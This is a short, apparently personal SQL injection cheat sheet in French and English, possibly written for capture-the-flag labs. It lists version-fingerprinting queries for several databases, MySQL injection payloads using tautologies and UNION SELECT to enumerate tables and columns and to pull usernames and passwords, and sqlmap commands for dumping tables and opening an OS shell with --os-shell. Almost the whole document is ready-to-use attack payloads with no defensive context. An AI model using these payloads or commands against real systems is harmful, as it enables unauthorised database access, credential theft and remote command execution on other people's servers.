#SQLIinjection 
# Get Version of SGBD
*Oracle*
```
SELECT  banner  FROM  v $ version
```
*MySQL or MSSQL*
```
@@ version
```
*SQLite*
```
select sqlite_version()
```

# Commandes for SQLite
*Get all tables of database*
```
SELECT  group_concat ( tbl_name )  FROM  sqlite_master  WHERE  type = ' table '  and  tbl_name  NOT  like  ' sqlite_% '
``` 
*Get all columns of a table*
```
SELECT  sql  FROM  sqlite_master  WHERE  type != ' meta '  AND  sql  NOT  NULL  AND  name = ' table_name '
```

# MySQL
*Chercher nombre de colonnes*
 ```
 ' or 0=0 order by 5#
 ```
 
```
 1 or 0=0 order by 4#
```
*Afficher toutes les occurences*
```
 ' or 0=0#
```

*Nom de base*
```
1 or 0=0 union select database(), user() #
``` 
*Chercher liste des  tables*
``` 
1 or 0=0 union all select 1, table_name from information_schema.tables#
```
*chercher liste des colonnes*
```
' or 0=0 union all select 2, column_name from information_schema.columns# 
```
*Mots de passe*
```
' or 0=0 union all select user, password from  users#
```


# sqlmap
*to get shell*
```
sqlmap -u 'http://htb/dashboard.php?search=any+query' --cookie="Name=value" --os-shell
``` 
*to chow databases*
```
sqlmap -u "http://localhost:8081/?id=1" --batch --dbs
```
*show tables*
```
sqlmap -u "http://localhost:8081/?id=1" -D soccer_db --tables
```
*columns*
```
sqlmap -u "http://adress/?id=1" -D db_name -T table_name -dump
```